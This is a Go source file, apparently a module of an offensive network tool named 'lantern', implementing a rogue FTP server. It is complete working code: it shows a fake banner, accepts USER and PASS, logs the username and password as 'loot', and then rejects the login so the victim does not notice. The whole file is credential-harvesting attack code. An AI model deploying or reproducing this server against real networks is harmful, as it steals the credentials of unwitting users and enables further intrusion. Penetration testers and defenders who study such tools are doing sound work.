// Package ftp implements a rogue FTP server that captures cleartext
// credentials. It presents a banner, accepts USER/PASS and records the
// account before refusing the login.
package ftp

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"lantern/internal/core"
)

const (
	ServiceName = "ftp"
	DefaultPort = 21
	readTimeout = 30 * time.Second
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "FTP",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("FTP poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)
	fmt.Fprint(conn, "220 FTP Server ready.\r\n")

	var user string
	for {
		core.SetDeadline(ctx, conn, readTimeout)
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		verb, arg := splitCommand(line)

		switch strings.ToUpper(verb) {
		case "USER":
			user = arg
			fmt.Fprint(conn, "331 User name okay, need password.\r\n")
		case "PASS":
			m.capture(client, user, arg)
			fmt.Fprint(conn, "530 User not logged in.\r\n")
			return
		case "QUIT":
			fmt.Fprint(conn, "221 Goodbye.\r\n")
			return
		default:
			fmt.Fprint(conn, "502 Command not implemented.\r\n")
		}
	}
}

func splitCommand(line string) (verb, arg string) {
	parts := strings.SplitN(line, " ", 2)
	verb = parts[0]
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}
	return verb, arg
}

func (m *Module) capture(client, user, pass string) {
	if m.Logger == nil {
		return
	}
	if user == "" {
		user = "<not provided>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[FTP] Cleartext credentials from %s", client),
		"[FTP] Username : %s\n[FTP] Password : %q\n[FTP] Hash     : %s:%s",
		user, pass, user, pass)
}
